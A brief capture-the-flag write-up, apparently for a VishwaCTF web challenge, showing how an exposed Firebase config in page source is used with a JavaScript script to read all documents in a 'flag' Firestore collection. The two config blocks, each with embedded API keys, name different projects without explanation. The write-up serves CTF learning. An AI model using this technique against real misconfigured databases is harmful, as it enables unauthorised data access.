# Flag Collection

After checking the source we find a firebase config.

```js
const firebaseConfig = {
  apiKey: "AIzaSyDHjPh1vkUeGy37mS3cHn-D1UU_oipuTYY",
  authDomain: "vishwactf-challenge12.firebaseapp.com",
  projectId: "vishwactf-challenge12",
  storageBucket: "vishwactf-challenge12.appspot.com",
  messagingSenderId: "435590274737",
  appId: "1:435590274737:web:2bfab4663703ba42c40c90",
};
```

Seems easy we get all documents from `flag` collection (as they hinted)

```js
import { initializeApp } from "firebase/app";
import { collection, getDocs, getFirestore } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyCOrohCmYL_hq5DaqFbQM3rxHXT0pNE6SA",
  authDomain: "vishwa-ctf-challenge-12.firebaseapp.com",
  projectId: "vishwa-ctf-challenge-12",
  storageBucket: "vishwa-ctf-challenge-12.appspot.com",
  messagingSenderId: "125452069157",
  appId: "1:125452069157:web:2d20b318f3e448ebfa52cc",
};

const firebaseApp = initializeApp(firebaseConfig);

const db = getFirestore();

getDocs(collection(db, "flag")).then((querySnapshot) => {
  querySnapshot.forEach((doc) => {
    console.log(`${doc.id} => ${doc.data().FLAG}`);
  });
});
```

There is our flag

![flag](flag.png)
